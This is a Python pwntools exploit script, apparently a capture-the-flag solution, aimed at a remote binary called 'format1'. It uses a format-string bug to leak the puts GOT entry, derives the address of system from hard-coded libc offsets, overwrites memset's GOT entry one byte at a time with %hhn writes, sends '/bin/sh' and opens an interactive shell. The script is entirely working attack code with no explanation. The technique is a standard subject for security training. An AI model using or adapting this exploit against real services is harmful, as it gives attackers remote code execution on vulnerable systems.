#!/usr/bin/env python

from pwn import *

# Io = process("./format1")
Io = remote("www.sniperoj.cn", 30020)

def leak(addr):
    Io.readuntil("input your choice:\n")
    Io.sendline("2")
    Io.readuntil("input your message\n")
    Io.sendline(p32(addr) + "%7$s")
    sleep(0.1)
    Io.readuntil("input your choice:\n")
    Io.sendline("3")
    full_leak_data = Io.readuntil("----------------------")
    full_leak_data = full_leak_data.replace("----------------------","")
    print full_leak_data
    leak_data = full_leak_data[20:24]
    print "[%s] -> [%s] = [%s]" % (hex(addr), leak_data.encode("hex"), repr(leak_data))
    return leak_data


puts_got = 0x08049118
memset_got = 0x8049130

puts_addr = u32(leak(puts_got))

system_offset = 0x0003ada0
puts_offset = 0x0005fca0

system_addr = puts_addr - puts_offset + system_offset

print "[+] system addr : %s" % hex(system_addr)
print "[+] puts addr : %s" % hex(puts_addr)
print "[+] puts_got : [%s]" % (hex(puts_got))
print "[+] memset_got : [%s]" % (hex(memset_got))


def get_number(up, down):
    if up < down:
        return down - up
    elif up == down:
        return 0
    else:
        return down + 256 - up

def write_memery(target, data, offset):
    lowest = data >> 8 * 3 & 0xFF
    low = data >> 8 * 2 & 0xFF
    high = data >> 8 * 1 & 0xFF
    highest = data >> 8 * 0 & 0xFF
    printed = 0
    payload = p32(target + 3) + p32(target + 2) + p32(target + 1) + p32(target + 0)
    printed += len(payload)
    length_lowest = lowest - printed
    length_low = get_number(lowest, low)
    length_high = get_number(low, high)
    length_highest = get_number(high, highest)
    payload += '%' + str(length_lowest) + 'c' + '%' + str(offset) + '$hhn'
    payload += '%' + str(length_low) + 'c' + '%' + str(offset + 1) + '$hhn'
    payload += '%' + str(length_high) + 'c' + '%' + str(offset + 2) + '$hhn'
    payload += '%' + str(length_highest) + 'c' + '%' + str(offset + 3) + '$hhn'
    return payload

Io.readuntil("input your choice:\n")
Io.sendline("2")
Io.readuntil("input your message\n")

payload = write_memery(memset_got, system_addr, 7)

print repr(payload)

Io.sendline(payload)
Io.sendline("3")
Io.sendline("2")
Io.sendline("/bin/sh")
Io.sendline("2")
Io.interactive()